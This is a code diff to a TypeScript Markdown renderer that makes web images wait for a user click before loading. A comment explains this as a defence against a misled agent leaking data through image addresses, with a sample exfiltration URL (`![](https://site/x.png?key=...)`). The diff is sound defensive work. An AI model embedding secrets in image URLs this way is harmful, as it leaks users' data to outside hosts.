@@ -4,6 +4,7 @@
 // refuses javascript: and similar links (file: links are let back in: they
 // only ever open in the side panel or Finder), and highlight.js escapes
 // the code it colours. So the output contains only tags this file produces.
+// Web images wait for a click (see the image rule below).
 
 import MarkdownIt from "markdown-it";
 import hljs from "highlight.js/lib/core";
@@ -56,6 +57,44 @@ md.renderer.rules.fence = (tokens, idx) => {
 };
 
 md.renderer.rules.code_block = (tokens, idx) => codeBlock(tokens[idx].content, "");
+
+// Web images are never fetched on their own. Fetching one sends its address
+// out, and an agent misled by what it read can put data in that address
+// (`![](https://site/x.png?key=...)`), so drawing the message would leak it.
+// Each shows as `[image: ...]` until clicked (see clicks.ts); one clicked
+// stays loaded when its text is drawn again. Images written into the text
+// (`data:`) send nothing and show at once. Any other address is a link.
+const loadedImages = new Set<string>();
+
+/** Remembers that the user loaded the web image at `src`. */
+export function imageLoaded(src: string) {
+  loadedImages.add(src);
+}
+
+md.renderer.rules.image = (tokens, idx, options, env, self) => {
+  const token = tokens[idx];
+  const src = String(token.attrGet("src") ?? "");
+  const alt = self.renderInlineAsText(token.children ?? [], options, env);
+  const esc = md.utils.escapeHtml;
+  if (/^data:/i.test(src) || (/^https?:/i.test(src) && loadedImages.has(src))) {
+    return `<img src="${esc(src)}" alt="${esc(alt)}">`;
+  }
+  if (/^https?:/i.test(src)) {
+    let label = alt;
+    if (!label) {
+      try {
+        label = new URL(src).host;
+      } catch {
+        label = src;
+      }
+    }
+    return (
+      `<button type="button" class="md-image" data-image="${esc(src)}" data-alt="${esc(alt)}" ` +
+      `title="${esc(src)}">[image: ${esc(label)}]</button>`
+    );
+  }
+  return `<a href="${esc(src)}">${esc(alt || src)}</a>`;
+};
 
 export function renderMarkdown(text: string): string {
   return md.render(text);
